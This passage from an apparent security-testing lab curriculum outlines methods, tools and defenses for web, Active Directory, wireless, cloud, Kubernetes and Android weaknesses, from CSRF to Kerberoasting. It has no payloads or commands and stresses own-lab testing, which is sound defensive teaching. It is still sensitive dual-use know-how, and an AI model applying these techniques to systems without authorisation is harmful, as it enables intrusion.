Retest after output encoding, sanitization, safe templating, and CSP. **Evidence:** Marker location, context screenshot, safe execution proof, CSP headers. **Defense:** Output encoding, CSP, sanitization, safe templating, HttpOnly/Secure cookies.

title: II-17. CSRF and State-Change Abuse
text: **Objective:** Test whether a browser can force an authenticated user to perform unwanted state changes. **Lab:** Your own app with authenticated test users and a harmless action. **Tools:** - Burp Suite — Create controlled CSRF proof - Browser DevTools — Inspect cookies and SameSite - OWASP ZAP — Baseline request review **Method:** 1. Identify state-changing GET/POST actions: profile, email, password, payment, settings. 2. Check CSRF token presence, uniqueness, validation, SameSite cookies, and origin checks. 3. Create a lab-only proof that performs a harmless action for a test user. 4. Verify whether JSON APIs, custom headers, and CORS prevent simple CSRF. 5. Retest with tokens, SameSite, origin validation, and reauthentication for sensitive actions. **Evidence:** State-change request, proof page, token/cookie behavior, mitigation result. **Defense:** CSRF tokens, SameSite, origin checks, reauthentication, deny unsafe methods.

title: II-18. IDOR and Broken Object-Level Authorization
text: **Objective:** Test whether users can access objects belonging to other users or tenants. **Lab:** Your own app with two users and private resources. **Tools:** - Burp Suite — Replay and modify IDs - Autorize — Authz comparison extension - Postman — Role-based API testing - Own test users — Controlled A/B testing **Method:** 1. Create two users and resources that should be private. 2. Capture IDs, GUIDs, tenant fields, role fields, and object paths. 3. Replay as another user and test read, update, delete, export, and share actions. 4. Test bulk endpoints, nested objects, alternate IDs, and encoded IDs. 5. Verify authorization happens server-side for every object access. **Evidence:** Role/object matrix, unauthorized response, request evidence, retest result. **Defense:** Server-side authorization, tenant checks, indirect references, audit logging.

title: II-19. Server-Side Request Forgery
text: **Objective:** Test whether the server can fetch attacker-influenced URLs or internal services. **Lab:** Lab URL-fetch feature and a local/internal listener. **Tools:** - Burp Suite — URL parameter testing - Interactsh/local callback — Outbound request detection - Local webhook — Capture lab callback - Metadata emulator — Simulate cloud metadata **Method:** 1. Find URL fetchers: preview, import, webhook, PDF/image generation, integrations. 2. Use lab callbacks to confirm outbound requests. 3. Test localhost, private ranges, redirects, DNS tricks, schemes, and parser differences. 4. Determine whether internal data is returned or only reachability is proven. 5. Retest after allowlists, egress filtering, redirect validation, and metadata protection. **Evidence:** Callback log, internal response proof, request timeline, egress policy. **Defense:** Allowlist, block private ranges, egress rules, metadata shielding, DNS pinning.

title: II-20. Server-Side Template Injection
text: **Objective:** Test whether user input is interpreted as a server-side template expression. **Lab:** Local app using a template engine with a test endpoint. **Tools:** - Burp Suite — Marker and context testing - Template engine docs — Identify syntax and safe behavior - Local app logs — Confirm evaluation path **Method:** 1. Identify reflected input that may be rendered by a template engine. 2. Submit harmless expression markers and fingerprint template behavior. 3. Confirm evaluation with safe math/string output in lab. 4. Determine whether template context exposes objects, environment variables, or code execution paths. 5. Retest after separating user input from templates and sandboxing rendering. **Evidence:** Marker output, template fingerprint, safe proof, code path. **Defense:** Never concatenate user input into templates, sandbox engines, least privilege.

title: II-21. XML External Entity and Parser Abuse
text: **Objective:** Test XML parsers for unsafe entity expansion and external resource access. **Lab:** Local XML upload/parser endpoint. **Tools:** - Burp Suite — Submit crafted XML fixtures - Local callback listener — Confirm external fetch - Parser logs — Inspect resolution behavior **Method:** 1. Identify XML upload, SOAP, SAML, import, or document parsing features. 2. Submit lab fixtures that test entity expansion and external resolution. 3. Confirm file/network access only against controlled test resources. 4. Check billion-laughs style expansion and parser error leakage safely. 5. Retest after disabling external entities and hardening parser settings. **Evidence:** XML fixture, callback/file proof, parser settings, errors. **Defense:** Disable external entities, safe parser flags, schema validation, timeouts.

title: II-22. File Upload Abuse
text: **Objective:** Check whether uploaded files can execute, expose data, bypass filters, or harm users. **Lab:** Your own upload endpoint or vulnerable upload lab. **Tools:** - Burp Suite — Manipulate upload requests - EICAR test file — Harmless AV test - ClamAV — Detection validation - Storage logs — Verify file placement **Method:** 1. Map allowed types, size limits, storage paths, public URLs, processing, and access controls. 2. Test extension/MIME mismatch, double extensions, polyglots, traversal, and case tricks in lab. 3. Use harmless markers or EICAR; do not deploy real web shells. 4. Check whether files execute, render active content, or leak metadata. 5. Retest after allowlists, reprocessing, isolated storage, and access control. **Evidence:** Upload request, storage path, detection log, public URL behavior. **Defense:** Allowlist, inspect content, reprocess files, isolated storage, no execution.

title: II-23. Path Traversal and File Disclosure
text: **Objective:** Test whether file parameters can escape intended directories. **Lab:** Local vulnerable file-read endpoint with harmless test files. **Tools:** - Burp Suite — Manipulate file paths - Controlled canary files — Prove boundary escape - Application logs — Trace resolved paths **Method:** 1. Identify file download, image, log, template, and include parameters. 2. Test relative paths, encoded separators, absolute paths, and normalization behavior in lab. 3. Confirm access to a harmless canary file outside the intended directory. 4. Check whether archive extraction or file serving resolves symlinks. 5. Retest after path normalization, allowlists, and filesystem permissions. **Evidence:** Requested path, canary file result, resolution log, fix diff. **Defense:** Allowlist filenames, canonicalize paths, deny traversal, separate storage, least privilege.

title: II-24. Deserialization and Unsafe Object Handling
text: **Objective:** Test whether serialized objects or complex input can trigger unsafe behavior. **Lab:** Local app that accepts serialized/test data. **Tools:** - Burp Suite — Modify object payloads - ysoserial-style lab fixtures — Understand unsafe gadget chains only in local targets - App logs — Trace object loading **Method:** 1. Identify serialized blobs, Java/.NET/PHP object formats, pickle-like data, or framework object handling. 2. Fingerprint format and processing path. 3. Use local proof fixtures to confirm unsafe behavior without targeting real systems. 4. Review signing, type restrictions, and dependency exposure. 5. Retest after using safe formats, signatures, allowlists, and reduced gadget surface. **Evidence:** Input format, unsafe processing proof, dependency evidence, mitigation. **Defense:** Prefer JSON/simple formats, sign data, restrict types, patch libraries.

title: II-25. GraphQL Abuse
text: **Objective:** Test GraphQL for introspection, authorization, batching, nesting, and data exposure. **Lab:** Local GraphQL API with two roles and sensitive objects. **Tools:** - GraphQL Playground/Altair — Schema exploration - Burp Suite — Request replay - clairvoyance/graphw00f-style tools — Fingerprinting - Postman — Role-based tests **Method:** 1. Check whether introspection and suggestions are enabled in the environment. 2. Map queries, mutations, types, fields, roles, and sensitive objects. 3. Test BOLA on nodes, nested fields, mutations, aliases, and batch requests. 4. Check depth/cost limits, field suggestions, error leakage, and persisted queries. 5. Retest after authz per field, query cost limits, and introspection policy. **Evidence:** Schema map, unauthorized query, nesting/cost result, response evidence. **Defense:** Field-level authz, query depth limits, disable unnecessary introspection, cost controls.

title: II-26. WebSocket Abuse
text: **Objective:** Test real-time channels for missing authentication, authorization, injection, and cross-site issues. **Lab:** Local WebSocket service with two users and private channels. **Tools:** - Burp Suite — Inspect and replay WebSocket messages - websocat — Manual WebSocket interaction - Browser DevTools — Inspect frames and origin **Method:** 1. Map handshake, tokens, origins, channels, message types, and roles. 2. Test cross-site WebSocket hijacking conditions in a lab. 3. Check channel/object authorization and message injection paths. 4. Test rate limits, oversized messages, malformed JSON, and server errors. 5. Retest after origin checks, per-message authz, schema validation, and throttling. **Evidence:** Handshake, frame transcript, unauthorized channel proof, server errors. **Defense:** Origin validation, authz per message, schema validation, rate limits.

title: II-27. Business Logic and Race Conditions
text: **Objective:** Find flaws where valid features can be abused in unexpected sequences or quantities. **Lab:** Your own app with test balances, coupons, bookings, votes, or inventory. **Tools:** - Burp Suite Repeater/Turbo Intruder — Replay timing-sensitive requests - Postman runner — Repeat workflow - App logs — Correlate state changes **Method:** 1. Understand the business rule: one vote, one coupon, limited stock, price, transfer, approval. 2. Identify state transitions and places where checks happen before commit. 3. Test repeated requests, parallel requests, ordering changes, cancellation, and negative values in lab. 4. Confirm whether rules can be bypassed or duplicated safely. 5. Retest after transactions, idempotency keys, server-side state checks, and rate limits. **Evidence:** Workflow diagram, race test result, duplicated state evidence, fix diff. **Defense:** Atomic transactions, idempotency, server-side rules, quotas, fraud monitoring.

title: II-28. Cache Poisoning and Cache Deception
text: **Objective:** Test whether caching stores attacker-influenced or private responses incorrectly. **Lab:** Local reverse proxy/CDN-like cache in front of a test app. **Tools:** - Burp Suite — Header/path/cache testing - Local cache/proxy — Observe cache keys and hits - curl — Controlled response checks **Method:** 1. Identify cacheable endpoints, keyed headers, cookies, query strings, and authenticated responses. 2. Test unkeyed inputs that change output and observe whether responses are cached. 3. Check whether private pages can be cached or served to the wrong user. 4. Verify cache invalidation, vary headers, no-store, and CDN behavior. 5. Retest after safe cache keys, private no-store, and cache separation. **Evidence:** Cache hit/miss headers, poisoned/private response proof, config diff. **Defense:** Correct cache keys, no-store on private data, cache separation, CDN rules.

title: II-29. Subdomain Takeover and Dangling Records
text: **Objective:** Find DNS records pointing to unclaimed or decommissioned third-party resources. **Lab:** Your own domain and controlled test third-party resources. **Tools:** - subfinder/amass — Find subdomains - dnsx/dig — Resolve records - httpx — Capture response fingerprints - nuclei — Known takeover templates where appropriate **Method:** 1. Enumerate DNS records and identify CNAMEs pointing outside your direct control. 2. Check whether the provider resource still exists and whether the response shows unclaimed patterns. 3. Confirm ownership path safely; do not claim resources belonging to others. 4. Remove stale records or reclaim/secure the resource. 5. Add monitoring for future dangling records. **Evidence:** CNAME target, provider fingerprint, response evidence, DNS change. **Defense:** Remove stale DNS, monitor providers, document third-party asset owners.

title: II-30. Exposed Secrets and Repository Leakage
text: **Objective:** Find leaked keys, tokens, configs, backups, source maps, and repository metadata. **Lab:** Your own repo, app, and intentionally planted fake secrets. **Tools:** - gitleaks — Secret scanning - trufflehog — Credential leak detection - git — Inspect history - ffuf — Find .env/.git/backups in lab - GitHub/GitLab scanning — Repo exposure detection **Method:** 1. Scan repositories, history, issues, CI logs, packages, and deployed static files. 2. Check for `.env`, `.git`, source maps, backups, config dumps, keys, tokens, and credentials. 3. Classify secrets as real, test, expired, or fake; never expose real secrets in videos. 4. Rotate affected credentials and remove secrets from history where needed. 5. Add pre-commit hooks, CI scanning, secret managers, and least-privilege keys. **Evidence:** Leak location, redacted secret proof, rotation evidence, prevention control. **Defense:** Secret manager, rotation, repo scanning, CI controls, `.gitignore`, least-privilege tokens.

title: II-31. API Discovery and Schema Mapping
text: **Objective:** Discover API endpoints, versions, methods, schemas, and hidden parameters. **Lab:** Your own API or intentionally vulnerable API app. **Tools:** - Postman — Collections and replay - kiterunner — Route discovery - Arjun — Parameter discovery - Burp Suite — Intercept and replay - OpenAPI/Swagger files — Schema review **Method:** 1. Collect docs, JavaScript routes, mobile calls, gateway routes, and error responses. 2. Enumerate versions, methods, parameters, content types, auth schemes, and tenants. 3. Test undocumented or deprecated routes only within scope. 4. Build a route/auth/data matrix for further testing. 5. Document undocumented APIs and remove or secure them. **Evidence:** Route inventory, schemas, hidden parameters, auth map, undocumented endpoints. **Defense:** API inventory, gateway policies, deprecate old APIs, authz consistency.

title: II-32. API Authorization and BOLA
text: **Objective:** Test whether API users can access other users' objects, tenants, fields, or functions. **Lab:** Local API with two test users and tenant boundaries. **Tools:** - Burp Suite — Replay object requests - Postman — Role-based collections - Autorize — Authorization testing - jwt_tool — Inspect claims **Method:** 1. Map object IDs, tenant IDs, roles, claims, and authorization checks. 2. Replay every sensitive read/write/delete/export as a different role or tenant. 3. Test nested resources, bulk endpoints, filters, exports, and alternate object IDs. 4. Check hidden fields, mass assignment, admin flags, and verbose responses. 5. Retest after server-side authorization and response filtering. **Evidence:** Role matrix, unauthorized response, object ID evidence, fix diff. **Defense:** Object-level authz, tenant checks, response allowlists, audit logs.

title: II-33. Mass Assignment and Overposting
text: **Objective:** Test whether clients can set fields that should remain server-controlled. **Lab:** Local API or form with role/admin/status fields. **Tools:** - Burp Suite — Add/remove JSON fields - Postman — Modify request bodies - API schema — Compare client-visible vs server fields **Method:** 1. Identify models containing role, is_admin, balance, verified, tenant, status, owner, or price fields. 2. Add unexpected fields to create/update requests in lab. 3. Check whether the server accepts, ignores, or validates the fields. 4. Confirm impact with safe test objects and avoid touching real users. 5. Retest after explicit allowlists, DTOs, and server-side field restrictions. **Evidence:** Modified field, accepted response, object state before/after. **Defense:** Allowlist fields, separate DTOs, deny unknown properties, server-side assignment.

title: II-34. Rate Limiting and Resource Abuse
text: **Objective:** Check whether endpoints can be abused for spam, enumeration, denial of service, or costly operations. **Lab:** Your own API with small test load and monitoring. **Tools:** - k6/locust — Controlled load testing - Burp Suite — Repeat requests - API gateway logs — Rate and usage visibility - fail2ban/WAF — Rate-limit defense **Method:** 1. Identify expensive or sensitive endpoints: login, reset, search, export, email, SMS, upload. 2. Use a small controlled request volume in lab and observe limits, bursts, queues, and errors. 3. Test per-IP, per-account, per-token, and global limits. 4. Check whether errors reveal enumeration or resource exhaustion paths. 5. Retest after quotas, caching, queues, pagination limits, and anomaly detection. **Evidence:** Request volume, limiter behavior, error patterns, resource metrics. **Defense:** Rate limits, quotas, CAPTCHA where appropriate, caching, pagination caps, monitoring.

title: II-35. JWT and Token Handling
text: **Objective:** Audit token structure, signing, expiry, audience, issuer, rotation, and revocation. **Lab:** Local app issuing test JWTs. **Tools:** - jwt_tool — Inspect/test JWT behavior - jwt.io — Decode tokens - Burp Suite — Replay and modify claims - Auth server config — Verify signing and revocation **Method:** 1. Collect access, refresh, reset, and session tokens. 2. Inspect algorithm, issuer, audience, expiry, key ID, claims, and sensitive data. 3. Test expiry, revocation, algorithm confusion, weak keys, and claim trust in a lab. 4. Check refresh rotation, reuse detection, cookie flags, and logout behavior. 5. Retest after strong signing, short expiry, audience checks, rotation, and revocation. **Evidence:** Decoded token, expiry/revocation result, claim matrix, config evidence. **Defense:** Strong algorithms, short lifetimes, rotation, audience/issuer checks, secure storage.

title: II-36. OAuth/OIDC Flow Review
text: **Objective:** Audit login flows for redirect, state, nonce, scope, token, and client configuration errors. **Lab:** Local OAuth/OIDC test app or sandbox identity provider. **Tools:** - Burp Suite — Observe auth flow - OIDC debugger — Inspect tokens - Identity provider logs — Review redirect/client settings - Browser DevTools — Cookie/state inspection **Method:** 1. Map authorization endpoint, redirect URIs, client type, scopes, state, nonce, PKCE, and token storage. 2. Test redirect URI validation, state/nonce handling, and code/token leakage in lab. 3. Check whether tokens are stored safely and scopes are least privilege. 4. Review logout, refresh, consent, and third-party client behavior. 5. Retest after exact redirects, PKCE, state/nonce, short-lived tokens, and least scopes. **Evidence:** Flow diagram, redirect tests, token metadata, client config. **Defense:** Exact redirect URIs, PKCE, state/nonce, least scopes, secure storage.

title: II-37. Password Reset and Account Recovery Abuse
text: **Objective:** Audit reset/recovery for predictable tokens, account enumeration, takeover paths, and unsafe delivery. **Lab:** Your own app and test email accounts. **Tools:** - Burp Suite — Replay reset flows - Mailhog/local mailbox — Inspect reset emails - Test users — Validate ownership binding - Logs — Confirm reset events **Method:** 1. Map reset request, token creation, delivery, expiry, one-time use, and post-reset session behavior. 2. Check whether responses reveal whether an account exists. 3. Test token entropy, expiry, reuse, binding, rate limits, and notification emails. 4. Check whether old sessions remain active after reset. 5. Retest after single-use expiring tokens, rate limits, notifications, and session revocation. **Evidence:** Reset flow diagram, token lifecycle, enumeration result, session revocation. **Defense:** Single-use tokens, expiry, rate limits, user notification, revoke sessions.

title: II-38. WPA/WPA2 Handshake Audit
text: **Objective:** Audit your own Wi-Fi passphrase and client/AP behavior. **Lab:** Own AP, monitor-mode adapter, and test client. **Tools:** - aircrack-ng — Wireless capture and audit - airgeddon — Guided lab workflow - hcxdumptool/hcxtools — Handshake capture/conversion - Kismet — Wireless discovery - Wireshark — Packet inspection **Method:** 1. Use your own AP, channel, client, and test passphrase. 2. Capture the handshake created by your test client joining. 3. Audit passphrase strength against your own wordlists. 4. Check PMF, WPA2/WPA3 mode, WPS, admin UI, and client behavior. 5. Retest after stronger passphrase, WPA3 where possible, and WPS disabled. **Evidence:** Capture evidence, passphrase policy result, AP settings, retest. **Defense:** WPA3/strong WPA2, long passphrase, WPS off, PMF, firmware updates.

title: II-39. Router and WPS Configuration Audit
text: **Objective:** Audit the router/AP itself for weak admin controls and legacy features. **Lab:** Own router or virtual AP. **Tools:** - Router admin UI — Review settings - nmap — Scan your own AP - airgeddon — Wireless audit workflow - Firmware release notes — Patch review **Method:** 1. Inventory SSID, bands, encryption mode, admin password, remote management, UPnP, WPS, guest network. 2. Check firmware version and known vendor issues. 3. Test whether WPS PIN or weak setup paths are enabled in the lab. 4. Review logging, DNS, IoT/guest segmentation, and exposed admin services. 5. Apply hardening and retest exposed services. **Evidence:** Settings screenshots, firmware version, WPS/admin exposure, firewall rules. **Defense:** WPS off, unique admin password, remote admin off, patched firmware, guest isolation.

title: II-40. Rogue AP and Evil Twin Awareness
text: **Objective:** Demonstrate why users must verify networks and why organizations need wireless monitoring. **Lab:** Consenting lab users, own AP, clearly marked training scenario. **Tools:** - Own AP — Create a controlled training network - Kismet — Detect wireless infrastructure - Wireshark — Inspect traffic - Captive portal lab page — Teach verification behavior **Method:** 1. Use a lab AP and informed participants or your own devices only. 2. Show how similar SSIDs can confuse users and devices. 3. Do not collect credentials; use a harmless training page or network telemetry. 4. Measure whether users verify network name, certificate, captive portal, and VPN expectations. 5. Teach reporting and verification habits. **Evidence:** Training result, wireless logs, user report, safe demo screenshots. **Defense:** Wireless monitoring, certificate validation, VPN policy, guest-network education.

title: II-41. Bluetooth and BLE Audit
text: **Objective:** Audit your own Bluetooth/BLE devices for pairing, services, and exposure. **Lab:** Own BLE device, Android test phone, and isolated RF environment. **Tools:** - bluetoothctl — Linux Bluetooth control - nRF Connect — BLE service inspection - Kismet — Wireless discovery - Wireshark/Ubertooth where applicable — Traffic inspection **Method:** 1. Inventory device name, MAC, services, characteristics, pairing mode, and firmware. 2. Check discoverability, pairing requirements, write permissions, notifications, and firmware update flow. 3. Test only your own devices and reset them afterward. 4. Document whether unauthenticated reads/writes or weak pairing exist. 5. Apply firmware updates and pairing restrictions. **Evidence:** BLE service map, pairing mode, permissions, firmware evidence. **Defense:** Authenticated pairing, least-privilege characteristics, updates, disable discovery when unused.

title: II-42. AD Recon with BloodHound
text: **Objective:** Map identity relationships and privilege paths in a controlled domain. **Lab:** Your own AD lab with users, groups, computers, and service accounts. **Tools:** - SharpHound — Collect AD data - BloodHound — Graph privilege paths - PowerView-style functions — AD enumeration - PingCastle — AD posture audit **Method:** 1. Create test users, groups, computers, service accounts, and intentional privilege paths. 2. Collect AD data and load it into BloodHound. 3. Identify shortest paths to privileged groups and high-value systems. 4. Validate graph edges manually before reporting them. 5. Fix the specific relationship: membership, ACL, delegation, admin, or credential exposure. 6. Recollect after changes and verify paths disappeared. **Evidence:** BloodHound graph, path screenshot, collection logs, remediation diff. **Defense:** Least privilege, tiered admin, ACL hygiene, monitored AD changes.

title: II-43. Kerberoasting Audit
text: **Objective:** Find service accounts whose tickets could be targeted because of weak password practices. **Lab:** Your own AD lab with test SPN service accounts. **Tools:** - BloodHound — Find service-account paths - Impacket GetUserSPNs — Enumerate SPN accounts in lab - Rubeus — Kerberos testing in lab - PowerShell — Review SPNs and account policy **Method:** 1. Identify accounts with SPNs, especially high-privilege or old service accounts. 2. Review password age, complexity, encryption settings, delegation, and privilege. 3. Audit only your own service accounts; do not crack or reuse real credentials. 4. Use controlled password-policy testing to determine whether the account is weak. 5. Rotate weak service passwords, use gMSA where possible, and reduce privileges. **Evidence:** SPN inventory, privilege mapping, password policy result, rotation proof. **Defense:** gMSA, long service passwords, least privilege, monitor abnormal ticket requests.

title: II-44. AS-REP Roasting and Pre-Authentication Audit
text: **Objective:** Find accounts with Kerberos pre-authentication disabled and weak password posture. **Lab:** Your own AD lab with test accounts intentionally configured for audit. **Tools:** - Impacket GetNPUsers — Enumerate pre-auth-disabled accounts in lab - PowerShell — Review account flags - BloodHound — Check privilege relevance - ADUC — Account configuration review **Method:** 1. Enumerate accounts with `Do not require Kerberos preauthentication` enabled. 2. Identify which accounts are privileged, stale, service-related, or unnecessary. 3. Validate password strength policy without using real credential material. 4. Enable pre-authentication and rotate weak credentials. 5. Monitor for abnormal AS-REQ patterns. **Evidence:** Affected account list, privilege level, remediation evidence, detection note. **Defense:** Require pre-auth, strong passwords, disable stale accounts, detect abnormal requests.

title: II-45. Delegation, ACL, and GPO Abuse Review
text: **Objective:** Audit AD configurations that let lower-privilege users gain control over important objects. **Lab:** AD lab with test ACLs, GPOs, and delegation settings. **Tools:** - BloodHound — Graph object control - PowerShell/ADUC — Review ACLs and delegation - PingCastle — AD risk audit - GPMC — Review GPO links/permissions **Method:** 1. Map who can reset passwords, modify groups, write GPOs, control computers, or delegate services. 2. Identify unconstrained, constrained, and resource-based delegation paths. 3. Validate one path at a time with test accounts. 4. Remove unnecessary rights and separate administration tiers. 5. Monitor sensitive ACL/GPO/group changes. **Evidence:** Object-control graph, ACL/GPO evidence, validated path, remediation. **Defense:** Tiered administration, least privilege, constrained delegation, change monitoring.

title: II-46. AD CS Misconfiguration Audit
text: **Objective:** Audit certificate templates and enrollment rights for paths that could enable identity abuse. **Lab:** AD CS lab with intentionally weak templates. **Tools:** - Certify — AD CS enumeration in lab - Certipy — AD CS auditing - certutil — Windows certificate review - BloodHound — Identity path context **Method:** 1. Enumerate templates, enrollment rights, EKUs, manager approvals, and issuance policies. 2. Identify templates allowing client auth, enrollment by low-privilege users, or dangerous subject control. 3. Validate only with test users and lab-issued certificates. 4. Restrict enrollment, require approvals, disable dangerous templates, and monitor requests. 5. Document residual risk and compensating controls. **Evidence:** Template inventory, risky settings, test certificate result, remediation. **Defense:** Secure templates, manager approval, least enrollment rights, monitor issuance.

title: II-47. Credential Hygiene and Local Admin Reuse
text: **Objective:** Audit where credentials, local admin passwords, or privileged sessions create lateral-movement risk. **Lab:** Your own Windows lab with test accounts and LAPS where possible. **Tools:** - BloodHound — Local admin/session paths - LAPS — Local admin password control - NetExec — Validate local admin relationships in lab - Windows event logs — Monitor privileged use **Method:** 1. Inventory local admin groups, privileged sessions, service accounts, scheduled tasks, and saved credentials. 2. Identify password reuse patterns using test systems and policy checks. 3. Review where privileged accounts log in and whether workstation/server/admin tiers are separated. 4. Deploy unique local admin passwords and remove unnecessary privileged access. 5. Monitor new admin assignments and privileged logons. **Evidence:** Local admin matrix, reuse risk, LAPS status, privileged logon evidence. **Defense:** LAPS, tiered admin, no shared credentials, secure service accounts, privileged access monitoring.

title: II-48. Linux Privilege Escalation Audit
text: **Objective:** Find local Linux misconfigurations that could turn a low-privilege foothold into root. **Lab:** Your own Linux VM with intentional misconfigurations. **Tools:** - linpeas — Privilege-escalation audit - pspy — Observe cron/processes - Lynis — System hardening audit - find/stat/sudo -l — Manual permission review **Method:** 1. Run audit tools and collect system, permission, process, credential, and service information. 2. Prioritize sudo rules, SUID files, writable service paths, cron jobs, NFS, capabilities, and secrets. 3. Validate one path at a time and avoid persistence mechanisms. 4. Map each finding to ownership, permissions, patch, or config fix. 5. Retest from a normal account after remediation. **Evidence:** Audit output, permission evidence, privilege path, fix and retest. **Defense:** Least privilege, patch, secure sudo/SUID, secret hygiene, auditd detection.

title: II-49. Windows Privilege Escalation Audit
text: **Objective:** Find Windows misconfigurations that let a normal account gain admin control. **Lab:** Your own Windows VM snapshot. **Tools:** - winpeas — Windows privesc audit - PowerUp-style checks — PowerShell enumeration - Sysinternals Autoruns — Startup/persistence review - Windows event logs — Privilege/use evidence **Method:** 1. Audit services, scheduled tasks, registry permissions, DLL paths, stored credentials, tokens, and local admins. 2. Validate service/path permissions and unsafe startup behavior using test services only. 3. Check privilege assignments and token-related weaknesses conceptually. 4. Fix service ACLs, paths, permissions, secrets, and unnecessary privileges. 5. Retest from a standard account. **Evidence:** Audit output, vulnerable service/path evidence, privilege path, fix diff. **Defense:** Least privilege, service hardening, patch, credential hygiene, monitoring.

title: II-50. Persistence Mechanism Awareness
text: **Objective:** Learn where attackers might try to survive reboots and how to detect/remove those mechanisms in a lab. **Lab:** Own VM with monitoring enabled; no real persistence deployment needed. **Tools:** - Autoruns — Windows persistence review - auditd/sysmon — Monitor changes - osquery — Query startup/persistence locations - Lynis — Linux persistence/config review **Method:** 1. Inventory startup folders, services, scheduled tasks, registry run keys, cron/systemd, shells, browser extensions, and agents. 2. Use test benign entries to verify monitoring, not real malware. 3. Record owner, signature, path, hash, parent process, and creation time. 4. Remove unauthorized persistence paths and harden write permissions. 5. Build detections for new persistence locations. **Evidence:** Persistence inventory, benign test detection, removal evidence, monitoring rule. **Defense:** Startup auditing, least privilege, EDR, integrity monitoring.

title: II-51. Cloud IAM Privilege Path Audit
text: **Objective:** Find cloud identities and policies that allow privilege escalation or excessive access. **Lab:** Sandbox AWS/Azure/GCP account. **Tools:** - Prowler — Cloud security checks - ScoutSuite — Multi-cloud audit - Cloudsplaining/IAM tools — Policy risk review - Cloud provider IAM advisor — Permission review **Method:** 1. Inventory users, roles, service accounts, policies, keys, federation, and trust relationships. 2. Identify wildcard permissions, privilege-escalation actions, unused credentials, and external access. 3. Validate risky policy paths using sandbox identities only. 4. Reduce permissions, remove old keys, add MFA/conditions, and separate duties. 5. Monitor policy changes and privileged actions. **Evidence:** IAM inventory, risky policy, privilege path, remediation evidence. **Defense:** Least privilege, permission boundaries, MFA, key rotation, policy monitoring.

title: II-52. Public Cloud Storage Exposure
text: **Objective:** Find public buckets, blobs, files, backups, logs, and sensitive objects. **Lab:** Sandbox cloud storage with test files only. **Tools:** - Prowler — Storage checks - ScoutSuite — Cloud exposure audit - Cloud provider policy tools — Public access review - Trivy/Checkov — IaC prevention **Method:** 1. Inventory buckets, containers, shares, objects, access policies, CDN endpoints, and logging. 2. Classify public access as intentional, accidental, or unknown. 3. Check for sensitive test files, backups, logs, source, credentials, and indexes. 4. Apply private-by-default controls and remove public objects. 5. Monitor for future public exposure and alert on policy changes. **Evidence:** Public object proof, policy diff, access logs, remediation evidence. **Defense:** Block public access, private buckets, least privilege, encryption, monitoring.

title: II-53. Cloud Metadata and SSRF Impact Review
text: **Objective:** Understand how SSRF or workload access can reach metadata services and what that exposes. **Lab:** Sandbox cloud workload and metadata emulator/test app. **Tools:** - Cloud metadata service — Review workload identity exposure - SSRF lab listener — Controlled request proof - Prowler — Cloud checks - Firewall/egress logs — Validate restrictions **Method:** 1. Identify workloads that fetch URLs or use instance metadata credentials. 2. Use a lab listener or emulator to prove server-side requests. 3. Review metadata service version, token enforcement, IAM permissions, and network reachability. 4. Reduce metadata credential permissions and require IMDSv2 where applicable. 5. Retest with egress controls and metadata restrictions. **Evidence:** Metadata reachability proof, IAM scope, SSRF callback, egress policy. **Defense:** IMDSv2, least-privilege roles, metadata firewalling, egress controls.

title: II-54. CI/CD Secret and Pipeline Audit
text: **Objective:** Find leaked secrets, overprivileged runners, unsafe triggers, and supply-chain paths. **Lab:** Test repository and CI pipeline with fake secrets. **Tools:** - gitleaks — Repo secret scanning - trufflehog — Credential detection - Checkov/Trivy — IaC and pipeline config checks - OIDC federation — Replace static cloud keys **Method:** 1. Scan repo history, workflows, logs, artifacts, dependencies, runner config, and environment variables. 2. Review who can trigger pipelines, modify workflows, approve deployments, and access secrets. 3. Identify self-hosted runner isolation and third-party action risk. 4. Rotate test secrets, restrict environments, require reviews, and pin actions/dependencies. 5. Add secret scanning, protected branches, OIDC, artifact signing, and deployment approvals. **Evidence:** Leaked fake secret proof, workflow permissions, runner risk, remediation. **Defense:** OIDC, secret scanning, protected environments, least privilege, signed artifacts.

title: II-55. Kubernetes RBAC and Service Account Audit
text: **Objective:** Find excessive pod/API permissions and identity paths inside a cluster. **Lab:** Kind/minikube or isolated test cluster. **Tools:** - kubectl — Inspect roles/bindings/serviceaccounts - kube-bench — Cluster benchmark - kube-hunter — Cluster exposure checks - Trivy — Config/image findings - Falco — Runtime detection **Method:** 1. Inventory namespaces, roles, clusterroles, bindings, serviceaccounts, secrets, and workload identities. 2. Identify wildcard verbs/resources, cluster-admin bindings, token mounting, and cloud role links. 3. Test what a compromised test pod can list, read, create, or escalate. 4. Reduce bindings, disable token automount where possible, and isolate namespaces. 5. Verify runtime alerts for sensitive API actions. **Evidence:** RBAC matrix, service-account permissions, pod test result, remediation diff. **Defense:** Least-privilege RBAC, no unnecessary cluster-admin, namespace isolation, runtime detection.

title: II-56. Kubernetes Workload and Network Policy Audit
text: **Objective:** Audit pods, images, ingress, secrets, and pod-to-pod access. **Lab:** Kind/minikube test cluster. **Tools:** - kube-bench — Benchmarks - kube-hunter — Attack surface review - Trivy — Image/config scanning - NetworkPolicy — Restrict traffic - Falco — Runtime alerts **Method:** 1. Review image provenance, tags, vulnerabilities, privileged flags, capabilities, host mounts, and root user. 2. Map ingress/egress and which pods can reach sensitive services. 3. Check secret exposure through env vars, volumes, logs, and API access. 4. Apply non-root, read-only filesystem, dropped capabilities, image digests, and network policies. 5. Retest with a simulated compromised pod. **Evidence:** Pod spec, image scan, network map, secret exposure, runtime alert. **Defense:** Pod security, network policies, secret management, trusted images, runtime monitoring.

title: II-57. Android Static Analysis
text: **Objective:** Inspect an Android app for secrets, permissions, insecure storage, exported components, and weak crypto. **Lab:** Own APK or a vulnerable training APK on an emulator. **Tools:** - MobSF — Automated mobile analysis - jadx — Decompile Java/Kotlin - apktool — Inspect resources and manifest - Android Studio — Emulator/log review - Ghidra — Native library review **Method:** 1. Review manifest, permissions, activities, services, providers, receivers, network config, and signing. 2. Decompile and search for keys, URLs, tokens, certs, debug code, and insecure functions. 3. Inspect storage locations, WebViews, intents, deep links, and crypto usage. 4. Confirm findings with controlled dynamic tests. 5. Retest after removing secrets, fixing storage, narrowing exports, and updating dependencies. **Evidence:** MobSF report, manifest findings, decompiled snippets, insecure config evidence. **Defense:** No hardcoded secrets, least permissions, secure storage, exported-component restrictions.

title: II-58. Mobile Dynamic and Runtime Testing
